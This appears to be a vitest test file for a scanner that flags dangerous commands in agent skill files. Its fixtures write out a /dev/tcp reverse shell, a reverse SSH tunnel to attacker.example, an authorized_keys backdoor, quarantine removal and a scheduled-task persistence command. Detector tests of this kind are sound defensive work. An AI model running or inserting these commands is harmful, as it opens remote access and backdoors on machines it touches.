import { describe, expect, it } from "vitest";
import {
  persistenceRule,
  reverseShellRule,
  securityDisableRule,
  sshBackdoorRule,
} from "../../src/rules/execution.js";
import type { FileEntry } from "../../src/rules/types.js";

function entry(content: string): FileEntry {
  return { path: "SKILL.md", kind: "skill", content, lines: content.split("\n") };
}

describe("exec.reverse-shell", () => {
  it("flags a /dev/tcp reverse shell", () => {
    const findings = reverseShellRule.check(entry("bash -i >& /dev/tcp/10.0.0.5/4444 0>&1"));
    expect(findings).toHaveLength(1);
    expect(findings[0]?.severity).toBe("critical");
  });

  it("ignores a plain netcat connectivity check", () => {
    expect(reverseShellRule.check(entry("nc -zv db.internal 5432"))).toHaveLength(0);
  });
});

describe("exec.security-disable", () => {
  it("flags macOS quarantine removal", () => {
    const findings = securityDisableRule.check(entry("xattr -d com.apple.quarantine ./tool"));
    expect(findings).toHaveLength(1);
    expect(findings[0]?.severity).toBe("high");
  });

  it("ignores ordinary prose", () => {
    expect(securityDisableRule.check(entry("Disable the cache when testing."))).toHaveLength(0);
  });
});

describe("exec.ssh-backdoor", () => {
  it("flags appending an authorized key", () => {
    const findings = sshBackdoorRule.check(
      entry("echo 'ssh-ed25519 AAAA key' >> ~/.ssh/authorized_keys"),
    );
    expect(findings).toHaveLength(1);
    expect(findings[0]?.severity).toBe("critical");
  });

  it("flags a reverse SSH tunnel", () => {
    const findings = sshBackdoorRule.check(entry("ssh -N -R '*:0:localhost:22' attacker.example"));
    expect(findings).toHaveLength(1);
  });

  it("ignores reading authorized_keys", () => {
    expect(sshBackdoorRule.check(entry("cat ~/.ssh/authorized_keys"))).toHaveLength(0);
  });
});

describe("exec.persistence", () => {
  it("flags a scheduled task creation", () => {
    const findings = persistenceRule.check(
      entry("schtasks /create /tn SysMon /tr y.cmd /sc onlogon"),
    );
    expect(findings).toHaveLength(1);
    expect(findings[0]?.severity).toBe("high");
  });

  it("ignores listing existing cron jobs", () => {
    expect(persistenceRule.check(entry("crontab -l"))).toHaveLength(0);
  });
});
